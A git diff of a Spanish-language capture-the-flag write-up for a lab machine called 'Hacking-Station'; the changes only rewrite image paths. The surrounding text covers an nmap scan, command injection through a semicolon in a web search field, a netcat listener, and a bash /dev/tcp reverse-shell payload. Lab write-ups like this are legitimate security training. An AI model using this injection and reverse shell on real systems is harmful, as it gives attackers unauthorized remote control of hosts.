@@ -47,14 +47,14 @@ Skills: • Ejecución de comandos (Inyección de comandos)
 
 # **Escaneo y Enumeración**
 
-![ip.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/ip.png)
+![ip.png](./Images/ip.png)
 
-![nmap.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/nmap.png)
+![nmap.png](./Images/nmap.png)
 
 - Servicios activos y puertos abiertos
     - El host en la dirección IP `192.168.11.10` tiene el puerto TCP 80 abierto y está ejecutando un servidor web Apache versión 2.4.57 en un sistema Debian.
 
-![nmap.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/nmap%201.png)
+![nmap.png](./Images/nmap%201.png)
 
 ```bash
 nmap -p- --open -sSCV --min-rate 5000 -vvv -n -Pn 192.168.11.10 -oN Scan
@@ -75,18 +75,18 @@ nmap -p- --open -sSCV --min-rate 5000 -vvv -n -Pn 192.168.11.10 -oN Scan
 
 # Pagina Web Hackingstation
 
-![webpage.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/webpage.png)
+![webpage.png](./Images/webpage.png)
 
-![webpage.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/webpage%201.png)
+![webpage.png](./Images/webpage%201.png)
 
 - Podemos ver que es una página web que se encarga de buscar exploits.
 - Se utilizo Android para realizar una búsqueda de Exploits en este SO, la pagina devuelve gran variedad de resultados en donde la palabra Android se encuentra en los Exploits listados.
 
 ## Inyectando comandos
 
-![webpage.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/webpage%202.png)
+![webpage.png](./Images/webpage%202.png)
 
-![webpage.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/webpage%203.png)
+![webpage.png](./Images/webpage%203.png)
 
 Se logra descubrir que en la barra de búsqueda, la página permite ejecutar comandos después de agregar un punto y coma (;).
 
@@ -108,7 +108,7 @@ Al evidenciar que se puede inyectar comandos, procedemos a hacer una reverse she
 
 ### Listener
 
-![listener.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/listener.png)
+![listener.png](./Images/listener.png)
 
 Comando listener:
 
@@ -125,7 +125,7 @@ nc -lvnp 8000
 
 ### Reverse shell
 
-![reverse.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/reverse.png)
+![reverse.png](./Images/reverse.png)
 
 ```bash
 zayrus; bash -c 'bash -i >& /dev/tcp/192.168.11.11/8000 0>&1’
@@ -141,7 +141,7 @@ Este es un método común para obtener una shell remota en un sistema comprometi
 
 ### Flag user
 
-![flaguser.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/flaguser.png)
+![flaguser.png](./Images/flaguser.png)
 
 1. Navegamos por el sistema hasta la carpeta home del usuario.
     1. Comando para ir al home del usuario
@@ -168,11 +168,11 @@ Este es un método común para obtener una shell remota en un sistema comprometi
 
 Listar los comandos permitidos con sudo
 
-![sudo.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/sudo.png)
+![sudo.png](./Images/sudo.png)
 
-![1.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/1.png)
+![1.png](./Images/1.png)
 
-![1.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/1%201.png)
+![1.png](./Images/1%201.png)
 
 1. Comando:
 
